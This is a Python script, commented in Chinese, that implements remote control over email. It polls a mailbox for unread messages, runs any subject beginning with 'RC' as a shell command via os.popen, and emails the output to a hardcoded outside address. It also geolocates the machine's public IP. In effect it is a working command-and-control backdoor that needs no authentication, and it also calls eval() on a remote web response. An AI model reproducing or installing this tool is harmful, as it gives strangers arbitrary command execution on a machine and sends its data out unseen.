'''
发邮件配置
收邮件配置
执行cmd命令  RC0   RC1dir  RC1ipconfig
'''
import yagmail
import imaplib
import email
import os
from bs4 import BeautifulSoup as bs
import requests
import logging

Send_Config = {
    "user_name": "xxxxxx@139.com",  # 用户名
    "password": "xxxxxx",  # 密码
    "email_server": "smtp.139.com",  # 服务器地址
}

Recieve_Config = {
    "user_name": "xxxxxxx@139.com",  # 用户名
    "password": "xxxxxx",  # 密码
    "email_server": "imap.139.com",  # 服务器地址
}


# ------------------------底层---------------------------

def MachineInfo_Page():
    result = ""
    url = "http://www.ip.cn/?bsvine=zlzu01"
    res = requests.get(url)
    html = res.content
    soup = bs(html, "lxml")
    infos = soup.select_one("#result")
    info_list = infos.select("p")
    for i in info_list:
        if len(i.text.strip()):
            result = result + '''{}
'''.format(i.text.strip())
    return result


def MachineInfo():
    url = "http://pv.sohu.com/cityjson?ie=utf-8"
    res = requests.get(url)
    res_text = res.text.split("=", maxsplit=1)[1].strip()[:-1]
    res_dict = eval(res_text)

    result = '''
        IP地址：{}
        所属城市：{}
        '''.format(res_dict["cip"], res_dict["cname"])
    return result

    return result


def SendEmail(name=Send_Config["user_name"], passwd=Send_Config["password"], email_server=Send_Config["email_server"],
              to_users=[], subject="", content="", file="", is_file=False):
    try:
        contents = []
        # todo 校验用户名密码
        contents.append(content)
        if is_file:
            contents.append(file)
        yag = yagmail.SMTP(user=name, password=passwd, host=email_server)
        yag.send(to_users, subject, contents)
        return {"result": "ok"}
    except Exception as e:
        return {"result": "fail", "reason": e}


def RecieveEmail():
    try:
        cmd_list = []
        conn = imaplib.IMAP4_SSL(port='993', host=Recieve_Config["email_server"])
        logging.info('已连接服务器')
        conn.login(Recieve_Config["user_name"], Recieve_Config["password"])
        logging.info('已登陆')
        conn.select()
        type, data = conn.search(None, 'UNSEEN')  # 未读邮件  #进行邮件查询
        # list_message = data[0].decode().split()  #py3
        list_message = data[0].split()  # py2
        logging.info("未读邮件列表: {}".format(list_message))
        if len(list_message) > 0:
            logging.info("有未读邮件，{}封".format(len(list_message)))
            for em in list_message:
                typ, msg_data = conn.fetch(em, '(RFC822)')
                msg = email.message_from_string(msg_data[0][1].decode('utf-8'))  # [0][1]是正文
                subject = msg['subject'].strip()
                # 注意到这里邮件仍是未读状态
                conn.store(em, '+FLAGS', '\Seen')  # 修改邮件状态为已读
                logging.info("邮件的主题：{}".format(subject))

                cmd_list.append(subject)
        conn.close()
        conn.logout()
        return {"result": "ok", "reason": cmd_list}
    except Exception as e:
        logging.error("邮件接收异常：{}".format(e))
        return {"result": "error", "reason": e}


def ExecCMD(cmd):
    logging.info(cmd)
    try:
        if "0" in cmd:
            # todo 获取机器信息
            res = MachineInfo()
            logging.info("获取机器信息")
        elif "1" in cmd:
            ccmd = cmd.split("1", maxsplit=1)[1]
            res = os.popen(ccmd).read()
            logging.info("执行cmd命令")
        logging.info(res)
        return {"result": "ok", "reason": res}
    except Exception as e:
        logging.error("执行cmd命令异常：{}".format(e))
        return {"result": "error", "reason": e}


# ------------------------接口---------------------------
def send_mail(to_user, subject="Report", content="", file="", is_file=False):
    '''
    传入：用户、组装好的数据
    :param to_user:
    :param details:
    :return:
    '''
    if not isinstance(to_user, list):
        to_user = [to_user]
    result = SendEmail(to_users=to_user, subject=subject, content=content, file=file, is_file=is_file)
    return result


def remote_control():
    '''
    远程控制功能，接收邮件，执行命令
    :return:
    '''
    CMD_LIST = []
    flag_recieve = RecieveEmail()
    if flag_recieve["result"] == "ok":
        CMD_LIST = flag_recieve["reason"]
    else:
        return flag_recieve
    for cmd in CMD_LIST:
        if cmd[:2] == "RC":  # 校验是否是远程命令
            flag_cmd = ExecCMD(cmd)
            send_mail("893216718@qq.com", "CMD_RESULT", flag_cmd["reason"])
